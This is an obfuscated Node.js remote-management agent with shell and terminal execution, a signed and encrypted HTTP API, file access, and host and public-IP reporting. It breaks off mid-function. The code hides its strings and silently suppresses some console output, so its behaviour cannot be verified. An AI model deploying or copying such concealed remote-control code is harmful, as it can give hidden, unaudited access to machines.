#!/usr/bin/env node
const a0U = a0b;
(function (a, b) {
    const T = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(T(0x32c)) / 0x1 + -parseInt(T(0x18f)) / 0x2 + parseInt(T(0x151)) / 0x3 * (-parseInt(T(0x15f)) / 0x4) + -parseInt(T(0x377)) / 0x5 + -parseInt(T(0x3ef)) / 0x6 * (-parseInt(T(0x1ab)) / 0x7) + parseInt(T(0x3a7)) / 0x8 + parseInt(T(0x245)) / 0x9;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x7e79f));
const a0c = [
    a0U(0x142),
    a0U(0x38d),
    a0U(0x2e5)
];
function a0d(a) {
    const V = a0U, b = {
            'iJhFn': function (c, d) {
                return c === d;
            },
            'cTYlp': V(0x252),
            'cCTpO': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const W = V, g = c[W(0x3f1)]();
        if (a0c['some'](h => g[W(0x1fb)](h))) {
            if (b['iJhFn'](typeof f, b[W(0x1aa)]))
                b[W(0x2c0)](f);
            return !![];
        }
        return a[W(0x1e3)](this, arguments);
    };
}
process[a0U(0x12d)][a0U(0x2f0)] = a0d(process[a0U(0x12d)]['write']), process[a0U(0x363)][a0U(0x2f0)] = a0d(process[a0U(0x363)][a0U(0x2f0)]);
const a0f = require(a0U(0x10f)), a0g = require(a0U(0x202)), a0h = require('fs'), a0i = require('fs')[a0U(0x1cb)], a0j = require(a0U(0x11b)), a0k = require('os'), {exec: a0l} = require('child_process'), a0m = require('node-cron'), a0n = require('systeminformation'), {encrypt: a0o} = require(a0U(0x383)), a0p = require(a0U(0x2dc)), a0q = require(a0U(0x2d5)), a0r = require(a0U(0x205)), a0s = require(a0U(0x20d)), a0t = new a0s['ec'](a0U(0x13f));
let a0u;
try {
    typeof Bun !== 'undefined' ? a0u = require('bun-pty') : a0u = require('@lydell/node-pty');
} catch (a0S) {
    console[a0U(0x1a3)](a0U(0x2ce)), console[a0U(0x1a3)](a0U(0x2f7) + a0S[a0U(0x3d7)]), console[a0U(0x1a3)]('💡\x20修复建议:\x20请在项目目录下运行\x20npm\x20install\x20@lydell/node-pty'), process['exit'](0x1);
}
const a0v = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const X = a0U, a = {
                'iVhNP': function (b, c) {
                    return b !== c;
                },
                'fOyIT': 'undefined'
            };
        return a['iVhNP'](typeof a0F, a[X(0x26c)]) && a[X(0x14a)](a0F['LOG_LEVEL'], undefined) ? a0F[X(0x243)] : 0x2;
    },
    'debug': a => {
        const Y = a0U, b = {
                'bYvtq': function (c, d) {
                    return c <= d;
                }
            };
        b[Y(0x2e1)](a0v[Y(0x1b3)], a0v['LEVELS']['DEBUG']) && console[Y(0x358)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const Z = a0U, b = {
                'WYyuq': function (c, d) {
                    return c <= d;
                }
            };
        b['WYyuq'](a0v[Z(0x1b3)], a0v['LEVELS']['INFO']) && console[Z(0x358)](Z(0x182) + a);
    },
    'warn': a => {
        const a0 = a0U, b = {
                'Wcauy': function (c, d) {
                    return c <= d;
                }
            };
        b[a0(0x3e4)](a0v['currentLevel'], a0v[a0(0x29d)][a0(0x1a0)]) && console[a0(0x358)](a0(0x39d) + a);
    },
    'error': a => {
        const a1 = a0U, b = {
                'ddcII': function (c, d) {
                    return c <= d;
                }
            };
        b[a1(0x1ac)](a0v['currentLevel'], a0v['LEVELS'][a1(0x194)]) && console['log'](a1(0x3b3) + a);
    }
};
class a0w {
    constructor(a = 'ok') {
        this['status'] = a;
    }
}
class a0x extends a0w {
    constructor(a = 'ok', b = 0x0) {
        const a2 = a0U;
        super(a), this[a2(0x293)] = b;
    }
}
class a0y extends a0w {
    constructor() {
        const a3 = a0U, a = { 'AODpA': a3(0x349) }, b = a[a3(0x3ec)][a3(0x311)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a3(0x323)] = null;
                continue;
            case '1':
                super();
                continue;
            case '2':
                this[a3(0x21e)] = a0F['AGENT_VERSION'];
                continue;
            case '3':
                this[a3(0x173)] = '';
                continue;
            case '4':
                this['gpu_name'] = '';
                continue;
            case '5':
                this[a3(0x1d7)] = 0x0;
                continue;
            case '6':
                this[a3(0x149)] = null;
                continue;
            case '7':
                this['os'] = '';
                continue;
            case '8':
                this[a3(0x17e)] = null;
                continue;
            case '9':
                this[a3(0x14f)] = 0x0;
                continue;
            case '10':
                this[a3(0x3bf)] = '';
                continue;
            case '11':
                this[a3(0x124)] = 0x0;
                continue;
            case '12':
                this[a3(0x130)] = 0x0;
                continue;
            case '13':
                this[a3(0x201)] = '';
                continue;
            case '14':
                this[a3(0x133)] = '';
                continue;
            case '15':
                this[a3(0x38b)] = '';
                continue;
            }
            break;
        }
    }
}
class a0z extends a0w {
    constructor() {
        const a4 = a0U;
        super(), this[a4(0x2e3)] = { 'usage': 0x0 }, this[a4(0x148)] = {
            'total': 0x0,
            'used': 0x0
        }, this[a4(0x3b5)] = {
            'total': 0x0,
            'used': 0x0
        }, this[a4(0x218)] = {
            'load1': 0x0,
            'load5': 0x0,
            'load15': 0x0
        }, this[a4(0x3da)] = {
            'total': 0x0,
            'used': 0x0
        }, this[a4(0x2b9)] = {
            'up': 0x0,
            'down': 0x0,
            'totalUp': 0x0,
            'totalDown': 0x0
        }, this[a4(0x380)] = {
            'tcp': 0x0,
            'udp': 0x0
        }, this['uptime'] = 0x0, this[a4(0x13a)] = 0x0, this[a4(0x3d7)] = '';
    }
}
class a0A extends a0w {
    constructor() {
        const a5 = a0U;
        super(), this['result'] = '', this[a5(0x25a)] = 0x0, this[a5(0x37e)] = ![], this[a5(0x29c)] = '';
    }
}
class a0B {
    constructor() {
        const a6 = a0U, a = { 'TflCq': '1|6|0|5|2|3|7|4' }, b = a[a6(0x3e0)][a6(0x311)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a6(0x295)] = '';
                continue;
            case '1':
                this[a6(0x29a)] = '';
                continue;
            case '2':
                this[a6(0x355)] = '';
                continue;
            case '3':
                this[a6(0x2cf)] = '';
                continue;
            case '4':
                this[a6(0x301)] = '';
                continue;
            case '5':
                this[a6(0x356)] = 0x0;
                continue;
            case '6':
                this['path'] = '';
                continue;
            case '7':
                this['mode_octal'] = '';
                continue;
            }
            break;
        }
    }
}
class a0C {
    constructor() {
        const a7 = a0U, a = a7(0x1b0)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[a7(0x23f)] = ![];
                continue;
            case '1':
                this['mode_octal'] = '';
                continue;
            case '2':
                this[a7(0x2cf)] = '';
                continue;
            case '3':
                this[a7(0x29a)] = '';
                continue;
            case '4':
                this[a7(0x295)] = '';
                continue;
            case '5':
                this['path'] = '';
                continue;
            case '6':
                this[a7(0x2cb)] = ![];
                continue;
            case '7':
                this[a7(0x2fc)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0D extends a0w {
    constructor() {
        const a8 = a0U;
        super(), this[a8(0x2e8)] = [];
    }
}
class a0E {
    static [a0U(0x2c2)]() {
        const a9 = a0U, a = {
                'GzcLc': a9(0x114),
                'IDcwD': a9(0x35c),
                'gOqnL': function (i, j) {
                    return i !== j;
                },
                'XVhWF': 'base64'
            }, {
                privateKey: b,
                publicKey: c
            } = a0g[a9(0x1e0)](a9(0x1d0)), d = b[a9(0x210)]({ 'format': a9(0x114) }), f = c[a9(0x210)]({ 'format': a[a9(0x326)] }), g = Buffer[a9(0x2a4)](d['d'], a['IDcwD']), h = Buffer[a9(0x2a4)](f['x'], a[a9(0x3bb)]);
        return (a[a9(0x247)](g[a9(0x3d0)], 0x20) || a[a9(0x247)](h[a9(0x3d0)], 0x20)) && a0v['error'](a9(0x396)), {
            'private_b64': g['toString'](a['XVhWF']),
            'public_b64': h[a9(0x3f1)](a['XVhWF'])
        };
    }
    static [a0U(0x141)](a) {
        const aa = a0U, b = this[aa(0x2c2)]();
        return {
            'role': a,
            'private_b64': b['private_b64'],
            'public_b64': b[aa(0x2b6)]
        };
    }
    static [a0U(0x325)](a = 'Controller', b = a0U(0x21a)) {
        const ab = a0U, c = {
                'control': this[ab(0x141)](a),
                'agent': this[ab(0x141)](b)
            };
        return c;
    }
}
class a0F {
    static [a0U(0x2b3)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0U(0x366)] = (process.env.EXEC_SHELL || a0U(0x22d))[a0U(0x318)]() === a0U(0x22d);
    static ['DEBUG'] = (process.env.DEBUG || a0U(0x280))[a0U(0x318)]() === 'true';
    static [a0U(0x3aa)] = parseInt(process.env.TIMESTAMP_WINDOW || a0U(0x281));
    static [a0U(0x243)] = parseInt(process.env.LOG_LEVEL || (this[a0U(0x18d)] ? '0' : '2'), 0xa);
    static [a0U(0x2df)] = a0F[a0U(0x118)](a0U(0x29f), a0U(0x154)) || 'ECDSA公钥内容';
    static [a0U(0x161)] = a0F[a0U(0x118)]('ECIES_PUBKEY', a0U(0x275)) || 'ECIES公钥内容';
    static ['FILE_ROOT'] = process.env.FILE_ROOT || a0k['homedir']();
    static [a0U(0x18b)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0U(0x242));
    static [a0U(0x209)] = (process.env.FOLLOW_SYMLINKS || a0U(0x280))['toLowerCase']() === a0U(0x22d);
    static [a0U(0x11e)] = (process.env.FILE_AUDIT_LOG || a0U(0x22d))[a0U(0x318)]() === a0U(0x22d);
    static [a0U(0x3b7)] = !![];
    static ['onetasks'] = [];
    static [a0U(0x138)] = {};
    static ['cronloop'] = ![];
    static [a0U(0x135)] = parseInt(process.env.TASK_TIMEOUT || a0U(0x2f3));
    static ['CRON_CHECK_INTERVAL'] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0U(0x16c)] = [];
    static [a0U(0x1c8)] = [];
    static [a0U(0x31f)] = parseInt(process.env.MAX_TASK_LOG || '100');
    static [a0U(0x144)] = process.env.HOST || a0U(0x262);
    static ['PORT'] = parseInt(process.env.PORT || process.env.SERVER_PORT || '8000');
    static [a0U(0x199)] = process.env.AGENT_VERSION || a0U(0x23d);
    static [a0U(0x223)] = a0g['randomBytes'](0x20)[a0U(0x3f1)](a0U(0x2b4));
    static [a0U(0x3e8)] = a0E[a0U(0x325)]();
    static [a0U(0x211)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL'][a0U(0x176)][a0U(0x3c9)] },
        'agent': { 'public': this[a0U(0x3e8)]['agent'][a0U(0x2b6)] }
    };
    static [a0U(0x118)](a, b) {
        const ac = a0U, c = { 'IjLoj': ac(0x215) }, d = process.env[a];
        if (d)
            return d;
        const f = a0j['join'](__dirname, b);
        if (a0h[ac(0x1c0)](f))
            try {
                return a0h[ac(0x2b1)](f, c['IjLoj'])['trim']();
            } catch (g) {
            }
        return '';
    }
    static ['validate']() {
        const ad = a0U, a = {
                'GQOtM': ad(0x2a0),
                'SxhKL': ad(0x276),
                'UlGsY': function (b, c) {
                    return b > c;
                },
                'rJWCi': ad(0x156),
                'atUwj': '❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):',
                'glttN': ad(0x35d),
                'myiZG': ad(0x1a8)
            };
        if (!this[ad(0x18d)]) {
            const b = [];
            !this[ad(0x2df)] && b['push'](a[ad(0x2b8)]);
            !this[ad(0x161)] && b[ad(0x32e)](a[ad(0x152)]);
            if (a[ad(0x147)](b['length'], 0x0)) {
                const c = a[ad(0x3cd)][ad(0x311)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0v['debug'](ad(0x36f));
                        continue;
                    case '1':
                        a0v[ad(0x1a3)](a[ad(0x12c)]);
                        continue;
                    case '2':
                        b[ad(0x278)](f => a0v['error'](ad(0x319) + f));
                        continue;
                    case '3':
                        a0v[ad(0x3e1)](a[ad(0x35a)]);
                        continue;
                    case '4':
                        a0v[ad(0x3e1)](a['myiZG']);
                        continue;
                    case '5':
                        process[ad(0x291)](0x1);
                        continue;
                    }
                    break;
                }
            }
        }
    }
}
class a0G {
    constructor(a, b) {
        const ae = a0U, c = { 'aYvZH': ae(0x20a) };
        this[ae(0x342)] = null, this[ae(0x391)] = null;
        if (a)
            try {
                const d = a[ae(0x19c)]();
                if (d['startsWith'](c[ae(0x333)]))
                    this['ecdsaPubkey'] = a0g['createPublicKey'](d);
                else {
                    const f = Buffer['from'](d, ae(0x2b4));
                    this[ae(0x342)] = a0t[ae(0x269)](f);
                }
            } catch (g) {
                a0v['error'](ae(0x17a) + g[ae(0x3d7)]), this[ae(0x342)] = null;
            }
        if (b)
            try {
                this[ae(0x391)] = a0p['toByteArray'](b[ae(0x19c)]());
            } catch (h) {
                a0v[ae(0x406)](ae(0x125) + h[ae(0x3d7)]);
            }
    }
    [a0U(0x1c1)](a, b, c) {
        const af = a0U, d = {
                'eNplp': function (f, g) {
                    return f / g;
                },
                'uDKou': function (f, g) {
                    return f - g;
                },
                'cQxyc': af(0x252),
                'Iuikk': af(0x25f)
            };
        if (!this['ecdsaPubkey'])
            return !![];
        try {
            const f = parseInt(b), g = Math[af(0x2b5)](d['eNplp'](Date[af(0x405)](), 0x3e8));
            if (Math[af(0x3ca)](g - f) > a0F[af(0x3aa)])
                throw new Error(af(0x184) + Math[af(0x3ca)](d[af(0x2c9)](g, f)) + af(0x2b0) + a0F[af(0x3aa)] + 's');
            const h = '' + a + b, i = a0p[af(0x3a3)](c);
            if (typeof this[af(0x342)][af(0x259)] === d['cQxyc']) {
                const j = a0g[af(0x290)](d[af(0x30a)])[af(0x129)](h)['digest']();
                return this[af(0x342)]['verify'](j, i);
            } else {
                const k = a0g[af(0x38f)](af(0x246));
                return k[af(0x129)](h), k[af(0x259)](this[af(0x342)], i);
            }
        } catch (l) {
            throw new Error(af(0x26d) + l[af(0x3d7)]);
        }
    }
    ['encryptResponse'](a) {
        const ag = a0U, b = {
                'MbQLx': 'utf-8',
                'FvDAl': function (c, d, f) {
                    return c(d, f);
                },
                'wsogd': ag(0x2b4)
            };
        if (a0F[ag(0x18d)] || !this['eciesPubkey'])
            return JSON[ag(0x3de)](a);
        try {
            const c = JSON[ag(0x3de)](a), d = Buffer[ag(0x2a4)](c, b[ag(0x379)]), f = Buffer[ag(0x2a4)](this[ag(0x391)]), g = b[ag(0x126)](a0o, f, d);
            return Buffer[ag(0x2a4)](g)[ag(0x3f1)](b[ag(0x297)]);
        } catch (h) {
            const i = {
                '_encrypt_error': h[ag(0x3d7)],
                '_raw': a0F[ag(0x18d)] ? a : null
            };
            return JSON[ag(0x3de)](i);
        }
    }
    [a0U(0x2fd)](a, b) {
        const ah = a0U, c = {
                'gctQc': function (d, f) {
                    return d !== f;
                },
                'AVEvk': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'EbjKx': 'base64',
                'lATmc': ah(0x215),
                'rNUYr': ah(0x38c),
                'uRKXw': 'aes-256-gcm'
            };
        if (!b || c[ah(0x15b)](b[ah(0x3d0)], 0x20))
            throw new Error(c[ah(0x294)]);
        try {
            const d = Buffer[ah(0x2a4)](a, c[ah(0x334)])[ah(0x3f1)](c[ah(0x361)]), f = JSON[ah(0x30c)](d);
            if (!f[ah(0x3bc)] || !f[ah(0x3b9)] || !f[ah(0x263)])
                throw new Error(c[ah(0x332)]);
            const g = Buffer[ah(0x2a4)](f[ah(0x3bc)], c['EbjKx']), h = Buffer[ah(0x2a4)](f['tag'], c[ah(0x334)]), i = Buffer[ah(0x2a4)](f[ah(0x263)], c[ah(0x334)]), j = a0g[ah(0x28a)](c[ah(0x239)], b, g);
            j[ah(0x32f)](h);
            let k = j[ah(0x129)](i, null, c[ah(0x361)]);
            return k += j[ah(0x3c0)](ah(0x215)), k;
        } catch (l) {
            throw new Error(ah(0x3c4) + l[ah(0x3d7)]);
        }
    }
}
function a0H(a) {
    const ai = a0U, b = {
            'eXOUC': ai(0x3e9),
            'SJWCg': function (c, d) {
                return c === d;
            },
            'lIbAi': ai(0x3d5),
            'gPeEv': function (c, d) {
                return c === d;
            },
            'TKcGk': ai(0x12f),
            'Uomas': ai(0x22d),
            'ELnet': ai(0x35b),
            'IrvbJ': function (c, d) {
                return c === d;
            },
            'XSNUG': ai(0x280),
            'TMzGW': 'Content-Length',
            'jrLRr': '/api/ws/',
            'zSPel': ai(0x39b),
            'hZagq': function (c, d) {
                return c === d;
            },
            'oKTwy': function (c) {
                return c();
            },
            'tgwyp': ai(0x327),
            'eXwkR': ai(0x204),
            'rONHi': ai(0x3f2),
            'reIGl': ai(0x1bd),
            'ubYgV': ai(0x2fb),
            'tLWXZ': ai(0x13d),
            'gOGWN': 'Missing\x20auth\x20headers',
            'DPsVa': 'x-aes-encrypted',
            'BUqHb': ai(0x254),
            'LyYWk': 'base64',
            'uAAjV': function (c, d) {
                return c === d;
            },
            'Xmyvc': function (c) {
                return c();
            }
        };
    return async (c, d, f) => {
        const aj = ai, g = {
                'WkeMq': aj(0x226),
                'VPlvH': b[aj(0x146)],
                'scbYD': function (j, k) {
                    const ak = aj;
                    return b[ak(0x2ae)](j, k);
                },
                'FkXyK': b[aj(0x131)],
                'tSHDP': function (j, k) {
                    return b['gPeEv'](j, k);
                },
                'jTEzr': b[aj(0x25e)],
                'hftRN': b['Uomas'],
                'SSQwc': b[aj(0x2f4)],
                'inqqN': 'utf8',
                'IIUCY': function (j, k) {
                    return b['IrvbJ'](j, k);
                },
                'uOMuC': b[aj(0x34d)],
                'gspXP': b['TMzGW']
            };
        if (c[aj(0x11b)][aj(0x3c3)](b[aj(0x2ba)]) || (c[aj(0x34f)][aj(0x191)] || '')[aj(0x318)]() === b[aj(0x36b)])
            return f();
        if (b[aj(0x1b8)](c[aj(0x3b4)], aj(0x30b)) || b[aj(0x398)](c['method'], aj(0x150)))
            return b[aj(0x164)](f);
        c['is_authenticated'] = !![];
        const h = [
            b[aj(0x32d)],
            '/api/status'
        ];
        if (!a0F[aj(0x18d)] && !c['headers'][b[aj(0x1e7)]]) {
            const j = c['headers'][aj(0x231)] || c[aj(0x34f)][aj(0x1d2)], k = c[aj(0x34f)][b['rONHi']] || c[aj(0x34f)][b['reIGl']], l = c[aj(0x34f)][b['ubYgV']] || c[aj(0x34f)][b[aj(0x121)]];
            if (!j || !k || !l) {
                if (h[aj(0x1fb)](c[aj(0x11b)]))
                    c[aj(0x228)] = ![];
                else
                    return d[aj(0x271)](0x191)[aj(0x395)]({ 'error': b[aj(0x3df)] });
            }
            if (c[aj(0x228)])
                try {
                    a[aj(0x1c1)](j, k, l);
                } catch (m) {
                    if (h['includes'](c[aj(0x11b)]))
                        c[aj(0x228)] = ![];
                    else
                        return d[aj(0x271)](0x191)[aj(0x395)]({ 'error': aj(0x26d) + m[aj(0x3d7)] });
                }
        }
        if (c[aj(0x31d)] && b[aj(0x1b8)](typeof c[aj(0x31d)], b[aj(0x131)])) {
            const n = (c[aj(0x34f)][b[aj(0x322)]] || '')[aj(0x318)]() === b[aj(0x300)];
            try {
                if (n && c[aj(0x228)]) {
                    const o = Buffer[aj(0x2a4)](a0F[aj(0x223)], aj(0x2b4)), p = a['decryptData'](c[aj(0x31d)], o);
                    c[aj(0x31d)] = JSON['parse'](p);
                } else {
                    if (c[aj(0x31d)][aj(0x3c3)](b[aj(0x203)])) {
                        const q = Buffer['from'](c[aj(0x31d)], b['LyYWk'])[aj(0x3f1)]('utf-8');
                        c[aj(0x31d)] = JSON[aj(0x30c)](q);
                    } else {
                        if (c['body'][aj(0x19c)]()[aj(0x3c3)]('{') || c[aj(0x31d)]['trim']()['startsWith']('['))
                            c['body'] = JSON[aj(0x30c)](c[aj(0x31d)]);
                        else {
                            if (b[aj(0x273)](c[aj(0x31d)][aj(0x19c)](), ''))
                                c[aj(0x31d)] = {};
                        }
                    }
                }
            } catch (r) {
                return a0v[aj(0x1a3)]('💥\x20[Body\x20Parse\x20Error]:\x20' + r[aj(0x3d7)]), d['status'](0x190)[aj(0x395)]({ 'error': aj(0x3be) + r[aj(0x3d7)] });
            }
        }
        const i = d[aj(0x1dd)];
        d[aj(0x1dd)] = function (s) {
            const al = aj;
            if (d[al(0x39f)](g['WkeMq']) && d[al(0x39f)]('Content-Type')['includes'](g[al(0x25b)]))
                try {
                    const t = g[al(0x403)](typeof s, g['FkXyK']) ? JSON['parse'](s) : s;
                    if (c['is_authenticated']) {
                        const u = a[al(0x165)](t), v = g[al(0x32a)](typeof u, g[al(0x37c)]) ? u : JSON[al(0x3de)](u);
                        return !a0F['DEBUG'] && (d[al(0x10c)](g[al(0x1fa)], g[al(0x328)]), d[al(0x10c)](g[al(0x3db)], a0F[al(0x199)])), d['set'](al(0x208), Buffer[al(0x11c)](v, g[al(0x241)])[al(0x3f1)]()), i[al(0x181)](this, v);
                    } else {
                        const w = g['IIUCY'](typeof s, g[al(0x37c)]) ? s : JSON[al(0x3de)](t);
                        return d[al(0x10c)](al(0x12f), g[al(0x2f6)]), d[al(0x10c)](g[al(0x1af)], Buffer[al(0x11c)](w, g[al(0x241)])[al(0x3f1)]()), i[al(0x181)](this, w);
                    }
                } catch (x) {
                    if (a0F[al(0x18d)])
                        a0v['error'](al(0x2e7) + x[al(0x3d7)]);
                }
            return i['call'](this, s);
        }, b['Xmyvc'](f);
    };
}
class a0I {
    constructor() {
        const am = a0U, a = {
                'QnABT': function (b, c) {
                    return b / c;
                }
            };
        this[am(0x2f2)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this['totalNetworkUp'] = 0x0, this[am(0x2db)] = 0x0, this[am(0x289)] = a[am(0x339)](Date[am(0x405)](), 0x3e8);
    }
    async [a0U(0x113)]() {
        const an = a0U, a = {
                'wPoTP': an(0x317),
                'uEvsb': an(0x215),
                'eMNLi': function (d, f) {
                    return d === f;
                },
                'wpyku': function (d, f, g) {
                    return d(f, g);
                },
                'UOfPH': function (d, f, g) {
                    return d(f, g);
                },
                'WPaRZ': function (d, f, g) {
                    return d(f, g);
                },
                'XbHlP': an(0x3a5),
                'DTxbl': function (d, f, g) {
                    return d(f, g);
                },
                'IZPxM': an(0x33b),
                'UJdSr': function (d, f) {
                    return d === f;
                },
                'LabmL': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0i[an(0x232)](a['wPoTP'], a[an(0x23c)]))['trim']();
            b = a[an(0x27d)](d, an(0x186)) ? null : a['wpyku'](parseInt, d, 0xa), c = a[an(0x18e)](parseInt, (await a0i[an(0x232)](an(0x2a3), a['uEvsb']))['trim'](), 0xa);
        } catch {
            try {
                b = a[an(0x320)](parseInt, (await a0i[an(0x232)](a[an(0x19a)], 'utf8'))[an(0x19c)](), 0xa), c = a['DTxbl'](parseInt, (await a0i[an(0x232)](a[an(0x17b)], a['uEvsb']))['trim'](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0n[an(0x235)]();
                b = f[an(0x1ea)], c = f[an(0x178)];
            }
        }
        if (a[an(0x378)](b, null)) {
            const g = await a0n['mem']();
            b = g[an(0x1ea)], (c === null || isNaN(c)) && (c = g['used']);
        }
        return {
            'total': b,
            'used': c,
            'available': a[an(0x19e)](b, c),
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const ao = a0U, [a, b, c, d] = await Promise[ao(0x3bd)]([
                a0n[ao(0x2e3)](),
                this['getContainerMemory'](),
                a0n[ao(0x3a1)](),
                a0n['networkInterfaces']()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[ao(0x3bd)]([
                this[ao(0x155)](),
                this[ao(0x1dc)]()
            ]);
        } catch (h) {
            a0v['debug'](ao(0x1b5) + h[ao(0x3d7)], 0x1);
        }
        return {
            'arch': a0k['arch'](),
            'cpu_cores': a[ao(0x230)],
            'cpu_name': a[ao(0x27e)],
            'disk_total': (await a0n[ao(0x386)]())[0x0]?.[ao(0x356)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[ao(0x1ea)],
            'os': c[ao(0x1f7)] + '\x20' + c[ao(0x15d)],
            'kernel_version': c['kernel'],
            'swap_total': b[ao(0x338)],
            'version': a0F[ao(0x199)],
            'virtualization': await this[ao(0x388)](),
            'session_key': a0F[ao(0x223)],
            'noise_key': a0F[ao(0x211)]
        };
    }
    [a0U(0x26e)]() {
        const ap = a0U, a = {
                'LYvkb': function (c, d) {
                    return c === d;
                }
            }, b = a0k[ap(0x190)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = d['family'] === ap(0x340) || a[ap(0x1f9)](d[ap(0x198)], 0x4);
                if (f && !d['internal']) {
                    if (!/^10\./[ap(0x3d3)](d[ap(0x14e)]) && !/^192\.168\./[ap(0x3d3)](d[ap(0x14e)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d['address']))
                        return d[ap(0x14e)];
                }
            }
        }
        return null;
    }
    async [a0U(0x155)]() {
        const aq = a0U, a = {
                'LgBaq': 'https://api.ipify.org',
                'CclkU': 'https://icanhazip.com',
                'jUPZQ': 'https://ipecho.net/plain',
                'aFvNA': aq(0x162)
            }, b = [
                a[aq(0x394)],
                a[aq(0x3eb)],
                'https://checkip.amazonaws.com',
                'https://ifconfig.me/ip',
                a['jUPZQ'],
                a[aq(0x174)],
                'https://myexternalip.com/raw'
            ];
        for (const d of b) {
            try {
                const f = await this['fetchIP'](d, 0x4);
                if (f && this[aq(0x23b)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[aq(0x26e)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    [a0U(0x321)]() {
        const ar = a0U, a = {
                'jOKts': function (c, d) {
                    return c === d;
                },
                'HqOuR': ar(0x292),
                'RKlPI': function (c, d) {
                    return c === d;
                },
                'oPuMv': ar(0x12e)
            }, b = a0k[ar(0x190)]();
        for (const c of Object[ar(0x399)](b)) {
            for (const d of b[c]) {
                const f = a[ar(0x3cb)](d['family'], a['HqOuR']) || a['RKlPI'](d['family'], 0x6);
                if (f && !d['internal']) {
                    if (!d[ar(0x14e)][ar(0x318)]()[ar(0x3c3)](a[ar(0x3fa)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0U(0x1dc)]() {
        const as = a0U, a = {
                'NxFeu': as(0x14c),
                'jGyzQ': 'https://v6.ident.me'
            }, b = this[as(0x321)]();
        if (b && this[as(0x1ff)](b))
            return b;
        const c = [
            a[as(0x2a5)],
            as(0x111),
            a['jGyzQ']
        ];
        for (const d of c) {
            try {
                const f = await this[as(0x187)](d, 0x6);
                if (f && this[as(0x1ff)](f))
                    return f;
            } catch (g) {
                a0v[as(0x3e1)]('访问\x20' + d + as(0x37a) + g[as(0x3d7)]);
                continue;
            }
        }
        return null;
    }
    async ['fetchIP'](a, b = 0x0) {
        const at = a0U, c = {
                'pwaxk': function (d, f) {
                    return d(f);
                },
                'TaqaA': at(0x2ec),
                'embCq': 'end',
                'TATIt': 'text/plain'
            };
        return new Promise((d, f) => {
            const au = at, g = c['pwaxk'](require, au(0x268)), h = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[au(0x1b7)] }
                }, i = g[au(0x39f)](a, h, j => {
                    const av = au;
                    let k = '';
                    if (j[av(0x2c5)] !== 0xc8) {
                        c['pwaxk'](f, new Error('HTTP\x20' + j[av(0x2c5)]));
                        return;
                    }
                    j['on'](c[av(0x10b)], l => k += l), j['on'](c[av(0x112)], () => d(k[av(0x19c)]()));
                });
            i['on'](au(0x1a3), f), i[au(0x16b)](0x1388, () => {
                i['destroy'](), f(new Error('请求超时'));
            });
        });
    }
    [a0U(0x23b)](a) {
        return /^(\d{1,3}\.){3}\d{1,3}$/['test'](a);
    }
    [a0U(0x1ff)](a) {
        const aw = a0U;
        if (!/^[0-9a-fA-F:]+$/[aw(0x3d3)](a) || !a[aw(0x1fb)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i['test'](a))
            return ![];
        return !![];
    }
    async [a0U(0x160)]() {
        const ax = a0U, a = {
                'OUMJg': function (m, n) {
                    return m / n;
                },
                'aTpMu': function (m, n) {
                    return m - n;
                },
                'lZfRo': function (m, n) {
                    return m / n;
                },
                'xzxRX': function (m, n) {
                    return m / n;
                },
                'wJLLr': function (m, n) {
                    return m * n;
                },
                'TkjQH': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[ax(0x3bd)]([
                a0n[ax(0x30f)](),
                a0n[ax(0x235)](),
                a0n[ax(0x1e9)](),
                a0n[ax(0x30f)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[ax(0x234)](Date['now'](), 0x3e8), i = h - this['lastNetworkTime'], j = g[ax(0x272)] - this['lastNetworkStats']['tx'], k = a[ax(0x1da)](g[ax(0x1ce)], this[ax(0x2f2)]['rx']);
        this[ax(0x370)] += j, this[ax(0x2db)] += k, this['lastNetworkStats'] = {
            'tx': g[ax(0x272)],
            'rx': g['rx_bytes']
        }, this['lastNetworkTime'] = h;
        const l = await a0n['processes']();
        return {
            'cpu': { 'usage': Math[ax(0x3a0)](b[ax(0x30f)]) },
            'ram': {
                'total': c['total'],
                'used': c[ax(0x392)]
            },
            'swap': {
                'total': c[ax(0x338)],
                'used': c[ax(0x353)]
            },
            'load': {
                'load1': a[ax(0x2a6)](Math['round'](f[ax(0x13c)] * 0x64), 0x64),
